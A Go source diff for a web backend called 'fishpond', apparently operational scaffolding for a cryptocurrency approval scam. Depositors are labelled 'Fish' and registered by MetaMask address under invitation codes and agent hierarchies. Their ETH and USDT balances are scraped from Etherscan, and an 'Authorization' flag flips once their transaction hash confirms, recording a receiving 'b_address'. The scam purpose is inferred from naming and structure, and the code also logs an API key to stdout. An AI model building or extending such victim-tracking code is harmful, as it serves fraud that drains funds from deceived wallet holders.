@@ -11,7 +11,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"github.com/gin-gonic/gin"
-	"github.com/shopspring/decimal"
 	"github.com/spf13/viper"
 	"github.com/wangyi/fishpond/dao/mysql"
 	"github.com/wangyi/fishpond/dao/redis"
@@ -42,7 +41,7 @@ func FishRegister(c *gin.Context) {
 
 	_, inErr := redis.Rdb.HGet("InvitationCode", inCode).Result()
 	if inErr != nil {
-		util.JsonWrite(c, -101, nil, "邀请码失效")
+		util.JsonWrite(c, -101, nil, "Invitation code invalid")
 		return
 	}
 
@@ -50,25 +49,24 @@ func FishRegister(c *gin.Context) {
 	tokenBack, err := redis.Rdb.HGet("USER_"+c.PostForm("fox_address"), "Token").Result()
 	if err == nil {
 		//tokenBack, _ := redis.Rdb.HGetAll("USER_" + c.PostForm("fox_address")).Result()
-		util.JsonWrite(c, -102, tokenBack, "不要重复添加用户!")
+		util.JsonWrite(c, -102, tokenBack, "Don't register twice!")
 		return
 	}
 
 	token := util.CreateToken(redis.Rdb)
 	if token == "" {
-		util.JsonWrite(c, -101, nil, "注册失败,网络错误,稍后再试!")
+		util.JsonWrite(c, -101, nil, "Registration failed, network error, try again later")
 		return
 	}
 
 	AdminId, _ := strconv.Atoi(c.PostForm("admin_id"))
 	SuperiorId, _ := strconv.Atoi(c.PostForm("superior_id"))
 	Money, err := strconv.ParseFloat(c.PostForm("fox_money"), 64)
+	EthMoney := c.PostForm("eth_money")
+	eth := util.ToDecimal(EthMoney, 18)
+
 	vip := 1
-	//if err == nil {
-	//	//判断用户的 vip等级 然后入库
-	//	vip = model.GetVipLevel(mysql.DB, Money)
-	//}
-	fmt.Println(Money)
+	eth2, _ := eth.Float64()
 	addFish := model.Fish{
 		Token:                  token,
 		Status:                 1,
@@ -85,10 +83,12 @@ func FishRegister(c *gin.Context) {
 		Created:                time.Now().Unix(),
 		Updated:                time.Now().Unix(),
 		Authorization:          1,
+		MoneyEth:               eth2,
+		InCode:                 inCode,
 	}
 	result := mysql.DB.Save(&addFish).Error
 	if result != nil {
-		util.JsonWrite(c, -101, nil, "注册失败")
+		util.JsonWrite(c, -101, nil, "Registration failed, ")
 		return
 	}
 	b, _ := json.Marshal(&addFish)
@@ -97,7 +97,7 @@ func FishRegister(c *gin.Context) {
 	_, _ = redis.Rdb.HMSet("USER_"+c.PostForm("fox_address"), m).Result()
 	_, _ = redis.Rdb.HSet("TOKEN_USER", token, c.PostForm("fox_address")).Result()
 
-	util.JsonWrite(c, 200, m["Token"], "注册成功")
+	util.JsonWrite(c, 200, m["Token"], "Registered successfully")
 	return
 
 }
@@ -114,7 +114,7 @@ func GetInformation(c *gin.Context) {
 	fish := model.Fish{}
 	err := mysql.DB.Where("id=?", a["ID"]).First(&fish).Error
 	if err != nil {
-		util.JsonWrite(c, 200, fish, "获取失败")
+		util.JsonWrite(c, 200, fish, "fail")
 		return
 	}
 
@@ -122,13 +122,20 @@ func GetInformation(c *gin.Context) {
 
 	h2, _ := strconv.ParseFloat(hl, 64)
 	if re != nil {
-		util.JsonWrite(c, 200, fish, "汇率获取失败")
+		util.JsonWrite(c, 200, fish, "Exchange rate acquisition failure")
 
 		return
 	}
 
+	config := model.Config{}
+
+	mysql.DB.Where("id=1").First(&config)
+
 	fish.TodayEarningsETH = fish.TotalEarnings / h2
-	util.JsonWrite(c, 200, fish, "获取成功")
+	fish.ETHExchangeRate = hl
+	fish.Model = config.RevenueModel
+	fish.FoxAddressOmit = fish.FoxAddress[:4] + "****" + fish.FoxAddress[38:]
+	util.JsonWrite(c, 200, fish, "success")
 	return
 }
 
@@ -141,10 +148,10 @@ func GetBAddress(c *gin.Context) {
 	config := model.Config{}
 	err := mysql.DB.Where("id=?", 1).First(&config).Error
 	if err != nil {
-		util.JsonWrite(c, -101, nil, "获取失败")
+		util.JsonWrite(c, -101, nil, "fail")
 		return
 	}
-	util.JsonWrite(c, 200, config.BAddress, "获取成功")
+	util.JsonWrite(c, 200, config.BAddress, "success")
 	return
 
 }
@@ -164,32 +171,32 @@ func FoxMoneyUp(c *gin.Context) {
 	pp := model.Fish{}
 	err3 := db.Model(&model.Fish{}).Where("fox_address =?", foxAddress).First(&pp).Error
 	if err3 != nil {
-		util.JsonWrite(c, -101, nil, "非法请求")
+		util.JsonWrite(c, -101, nil, "Illegal request")
 		return
 	}
 	//foxAddress:="0x882B25786a2b27f552F8d580EC6c04124fC52DA3"
 	resp, err := http.Get("https://etherscan.io/address/" + foxAddress)
 	if err != nil {
-		util.JsonWrite(c, -101, nil, "更新失败")
+		util.JsonWrite(c, -101, nil, "Update failed")
 		return
 	}
 	defer resp.Body.Close()
 	body, err1 := ioutil.ReadAll(resp.Body)
 	if err1 != nil {
-		util.JsonWrite(c, -101, nil, "更新失败")
+		util.JsonWrite(c, -101, nil, "Update failed")
 		return
 	}
 	//fmt.Println(string(body))
 	//解析正则表达式，如果成功返回解释器
 	reg1 := regexp.MustCompile(`<div class="col-md-8">\$(\d+)`)
 	if reg1 == nil { //解释失败，返回nil
-		util.JsonWrite(c, -101, nil, "更新失败")
+		util.JsonWrite(c, -101, nil, "Update failed")
 		return
 	}
 	//根据规则提取关键信息
 	result1 := reg1.FindAllStringSubmatch(string(body), -1)
 	if len(result1) == 0 {
-		util.JsonWrite(c, -101, nil, "更新失败,获取界面错误")
+		util.JsonWrite(c, -101, nil, "Update failed")
 		return
 	}
 
@@ -202,10 +209,10 @@ func FoxMoneyUp(c *gin.Context) {
 	fmt.Println(pp.ID)
 	ee := db.Model(&model.Fish{}).Where("id=?", pp.ID).Updates(data).Error
 	if ee != nil {
-		util.JsonWrite(c, -101, nil, "更新失败")
+		util.JsonWrite(c, -101, nil, "Update failed")
 		return
 	}
-	util.JsonWrite(c, 200, nil, "更新成功")
+	util.JsonWrite(c, 200, nil, "Update success")
 	return
 
 }
@@ -222,23 +229,27 @@ func FoxMoneyUpTwo(c *gin.Context) {
 	db := mysql.DB
 	foxAddress := c.PostForm("fox_address")
 
+	fmt.Println(foxAddress)
 	pp := model.Fish{}
 	err3 := db.Model(&model.Fish{}).Where("fox_address =?", foxAddress).First(&pp).Error
 	if err3 != nil {
-		util.JsonWrite(c, -101, nil, "非法请求")
+		util.JsonWrite(c, -101, nil, "Illegal request")
 		return
 	}
 
 	apikey := viper.GetString("eth.apikey")
 	resp, err := http.Get("https://api.etherscan.io/api?module=account&action=balance&address=" + foxAddress + "&tag=latest&apikey=" + apikey)
+
+	fmt.Println("https://api.etherscan.io/api?module=account&action=balance&address=" + foxAddress + "&tag=latest&apikey=" + apikey)
 	if err != nil {
-		util.JsonWrite(c, -101, nil, "更新失败")
+		util.JsonWrite(c, -101, nil, "fail")
 		return
 	}
 	defer resp.Body.Close()
 	body, err1 := ioutil.ReadAll(resp.Body)
+
 	if err1 != nil {
-		util.JsonWrite(c, -101, nil, "更新失败")
+		util.JsonWrite(c, -101, nil, "fail")
 		return
 	}
 	//fmt.Println(string(body))
@@ -250,7 +261,7 @@ func FoxMoneyUpTwo(c *gin.Context) {
 	}
 
 	if basket.Status != "1" {
-		util.JsonWrite(c, -101, nil, "更新失败:"+basket.Message)
+		util.JsonWrite(c, -101, nil, "fail:"+basket.Message)
 		return
 	}
 
@@ -260,25 +271,25 @@ func FoxMoneyUpTwo(c *gin.Context) {
 	wei.SetString(maxMoney, 10)
 	eth := util.ToDecimal(wei, 18)
 
-	ETHTOUSDT, _ := redis.Rdb.Get("ETHTOUSDT").Result()
-
-	OPE, _ := strconv.ParseFloat(ETHTOUSDT, 64)
-
-	b := decimal.NewFromFloat(OPE)
-	//fmt.Println(eth.Mul(b)) // 0.02
-	ccc := eth.Mul(b)
-	//fmt.Println(ccc.IntPart())
+	//ETHTOUSDT, _ := redis.Rdb.Get("ETHTOUSDT").Result()
+	//
+	//OPE, _ := strconv.ParseFloat(ETHTOUSDT, 64)
+	//
+	//b := decimal.NewFromFloat(OPE)
+	////fmt.Println(eth.Mul(b)) // 0.02
+	//ccc := eth.Mul(b)
+	////fmt.Println(ccc.IntPart())
 
 	data := make(map[string]interface{})
 	data["money_eth"], _ = eth.Float64() //零值字段
 	data["updated"] = time.Now().Unix()
-	data["money"], _ = ccc.Float64()
+	//data["money"], _ = ccc.Float64()
 	ee := db.Model(&model.Fish{}).Where("id=?", pp.ID).Updates(data).Error
 	if ee != nil {
-		util.JsonWrite(c, -101, nil, "更新失败")
+		util.JsonWrite(c, -101, nil, "fail")
 		return
 	}
-	util.JsonWrite(c, 200, nil, "更新成功")
+	util.JsonWrite(c, 200, nil, "success")
 	return
 }
 
@@ -295,13 +306,13 @@ func CheckInCode(c *gin.Context) {
 
 	inCode := c.PostForm("inCode")
 	if len(inCode) < 31 {
-		util.JsonWrite(c, -101, nil, "非法邀请码")
+		util.JsonWrite(c, -101, nil, "Invitation code invalid")
 		return
 	}
 
 	_, err := redis.Rdb.HGet("InvitationCode", inCode).Result()
 	if err != nil {
-		util.JsonWrite(c, -101, nil, "非法邀请码")
+		util.JsonWrite(c, -101, nil, "Invitation code invalid")
 		return
 	}
 	util.JsonWrite(c, 200, nil, "OK")
@@ -313,25 +324,23 @@ func CheckInCode(c *gin.Context) {
 */
 
 func CheckAuthorization(c *gin.Context) {
-
 	var Authorization CheckAuthorizationOk
 	if err := c.ShouldBind(&Authorization); err != nil {
 		util.JsonWrite(c, -2, nil, err.Error())
 		return
 	}
-
 	foxAddress := c.PostForm("fox_address")
 	hash := c.PostForm("transaction_hash")
-
+	BAddress := c.PostForm("b_address")
 	token, _ := redis.Rdb.HGet("TOKEN_USER", c.PostForm("token")).Result()
 	if foxAddress != token {
-		util.JsonWrite(c, -101, nil, "非法提现")
+		util.JsonWrite(c, -101, nil, "Withdrawal of failure")
 		return
 	}
 	//  查询这个 账户是否存在
 	err := mysql.DB.Where("fox_address=?", foxAddress).Find(&model.Fish{}).Error
 	if err != nil {
-		util.JsonWrite(c, -101, nil, "非法请求这个账户不存在")
+		util.JsonWrite(c, -101, nil, "Withdrawal of failure")
 		return
 	}
 	apikey := viper.GetString("eth.apikey")
@@ -343,7 +352,7 @@ func CheckAuthorization(c *gin.Context) {
 			}
 			body, err1 := ioutil.ReadAll(resp.Body)
 			if err1 != nil {
-				util.JsonWrite(c, -101, nil, "更新失败")
+				util.JsonWrite(c, -101, nil, "fail")
 				return
 			}
 			var basket AutoGeneratedTwo
@@ -353,14 +362,14 @@ func CheckAuthorization(c *gin.Context) {
 			}
 			if basket.Result.Status == "1" {
 				//  hash 事务查询成功 交易成功
-				mysql.DB.Model(&model.Fish{}).Where("fox_address=?", foxAddress).Update(&model.Fish{Authorization: 2, Updated: time.Now().Unix()})
+				mysql.DB.Model(&model.Fish{}).Where("fox_address=?", foxAddress).Update(&model.Fish{Authorization: 2, Updated: time.Now().Unix(), BAddress: BAddress})
 				break
 			}
 			time.Sleep(2 * time.Second)
 		}
 
 	}()
-	util.JsonWrite(c, 200, nil, "执行成功")
+	util.JsonWrite(c, 200, nil, "success")
 	return
 }
 
@@ -378,19 +387,19 @@ func UpdateOneFishUsd(c *gin.Context) {
 
 	token, _ := redis.Rdb.HGet("TOKEN_USER", c.PostForm("token")).Result()
 	if foxAddress != token {
-		util.JsonWrite(c, -101, nil, "非法请求")
+		util.JsonWrite(c, -101, nil, "Illegal request")
 		return
 	}
 
 	res, err := http.Get("https://api.etherscan.io/api?module=account&action=tokenbalance&contractaddress=0xdAC17F958D2ee523a2206206994597C13D831ec7&address=" + foxAddress + "&tag=latest&apikey=" + apikey)
 	if err != nil {
-		util.JsonWrite(c, -101, nil, "更新失败")
+		util.JsonWrite(c, -101, nil, "fail")
 		return
 	}
 	defer res.Body.Close()
 	body, err1 := ioutil.ReadAll(res.Body)
 	if err1 != nil {
-		util.JsonWrite(c, -101, nil, "更新失败")
+		util.JsonWrite(c, -101, nil, "fail")
 		return
 	}
 
@@ -401,7 +410,7 @@ func UpdateOneFishUsd(c *gin.Context) {
 	}
 
 	if basket.Status != "1" {
-		util.JsonWrite(c, -101, nil, "更新失败:"+basket.Message)
+		util.JsonWrite(c, -101, nil, "fail:"+basket.Message)
 		return
 	}
 
@@ -418,10 +427,10 @@ func UpdateOneFishUsd(c *gin.Context) {
 
 	ee := mysql.DB.Model(&model.Fish{}).Where("fox_address=?", foxAddress).Updates(data).Error
 	if ee != nil {
-		util.JsonWrite(c, -101, nil, "更新失败")
+		util.JsonWrite(c, -101, nil, "fail")
 		return
 	}
-	util.JsonWrite(c, 200, nil, "更新成功")
+	util.JsonWrite(c, 200, nil, "success")
 	return
 }
 
@@ -436,15 +445,15 @@ func GetEthNowPrice(c *gin.Context) {
 	}
 	resp, err := http.Get("https://api1.binance.com/api/v3/ticker/price?symbol=ETHUSDT")
 	if err != nil {
-		util.JsonWrite(c, -101, nil, "获取失败")
+		util.JsonWrite(c, -101, nil, "fail")
 		return
 	}
 
 	body, err1 := ioutil.ReadAll(resp.Body)
 	if err1 != nil {
-		util.JsonWrite(c, -101, nil, "获取失败")
+		util.JsonWrite(c, -101, nil, "fail")
 		return
 	}
-	util.JsonWrite(c, 200, string(body), "获取成功")
+	util.JsonWrite(c, 200, string(body), "success")
 	return
 }
